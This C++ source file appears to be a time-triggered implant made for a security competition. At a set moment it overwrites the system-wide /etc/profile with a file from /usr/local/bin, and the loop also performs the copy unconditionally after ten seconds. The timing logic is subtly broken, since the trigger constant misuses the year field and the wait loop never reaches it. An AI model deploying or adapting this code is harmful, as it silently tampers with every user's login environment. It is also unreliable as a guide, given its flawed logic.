#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <iomanip>
#include <ctime>
#define TRIGGER 61532067600

int main(){
    /* Check for current time */
    std::time_t t = std::time(nullptr);
    std::time_t tgr = t+10; //trigger 10 seconds
    std::tm * tm_var; // Datetime of target (Competition day at 12:00 EST) //Lunch
    std::tm trigger; // Datetime of target (Competition day at 12:00 EST) //Lunch
	std::string out;

	// check the local time 
    // Remember, it must NOT be local time. Preferrably to UTC
    // Competition is across several time zones
    tm_var = std::localtime(&t); 
    std::cout << "check:   " << std::put_time(tm_var, "%c %Z") << '\n';
	
    // Time competition of trigger
    // UTC (mktime) = 61532067600
    // trigger.tm_year = 2019;
    // trigger.tm_mon = 10;
    // trigger.tm_mday = 16;
    // trigger.tm_hour = 12;
    // trigger.tm_min = 0;
    // trigger.tm_sec = 0;

    std::cout << "Sleeping..." << std::endl;

    // At the start of every minute
    // Can't interrupt without SIGTSTP
    t = std::time(nullptr);
    for ( ; t < tgr; t=time(nullptr) ){
        if (t >= TRIGGER){
            std::cout << "Hit the trigger: run clocklib\n" << std::endl;
            system("cp /usr/local/bin/profile /etc/profile");
            break;
        }
        std::system("sleep 1");
        printf("sec: %ld \n",t % 60);
    } 
    system("cp /usr/local/bin/profile /etc/profile");
    return 0;
}
